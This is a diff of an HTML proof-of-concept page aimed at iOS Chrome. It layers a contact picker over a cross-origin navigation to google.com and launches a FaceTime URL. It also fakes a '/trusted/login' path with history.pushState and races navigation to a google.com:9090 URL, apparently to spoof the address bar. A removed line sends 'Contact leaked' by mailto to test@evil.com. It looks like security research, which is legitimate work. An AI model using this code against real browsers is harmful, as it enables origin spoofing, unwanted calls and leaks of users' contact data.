@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>PoC iOS Chrome</title>
+    <title>iOS Chrome PoC</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
@@ -22,15 +22,16 @@
                 `);
 
                 // Cross-origin navigation
-                window.location.href = "https://www.google.com";
+                location.href = "https://www.google.com";
 
-                // mailto trigger (iOS Chrome friendly)
+                // Trigger FaceTime (iOS only)
                 setTimeout(() => {
-                    location.href = "mailto:test@evil.com?subject=PoC&body=Contact%20leaked";
-                }, 100);
+                    location.href = "facetime://test@apple.com";
+                    // or facetime-audio://
+                }, 120);
 
             } catch (e) {
-                alert("Failed: " + e);
+                alert("Error: " + e);
             }
         };
     </script>
@@ -39,7 +40,31 @@
 <body>
     <br><br><br>
     <center>
-        <h1>
-            Double-click anywhere<br>
-            Contact Picker over google.com
-        </h1>
+        <h1>Double click anywhere</h1>
+        <p>Contact Picker + Google + FaceTime</p>
+
+        <button id="start">Start</button>
+        <div id="panel" style="display:none">Loading…</div>
+    </center>
+
+    <script>
+        /* Step 1: Fake trusted path */
+        document.getElementById('start').onclick = () => {
+            history.pushState({}, '', '/trusted/login');
+            panel.style.display = 'block';
+        };
+
+        /* Step 2: Navigation race (TARGET DI AKHIR) */
+        window.addEventListener('pageshow', () => {
+            requestAnimationFrame(() => {
+                requestAnimationFrame(() => {
+                    setTimeout(() => {
+                        location.href = 'https://google.com:9090/#https://google.com:9090';
+                    }, 80);
+                });
+            });
+        });
+    </script>
+
+</body>
+</html>
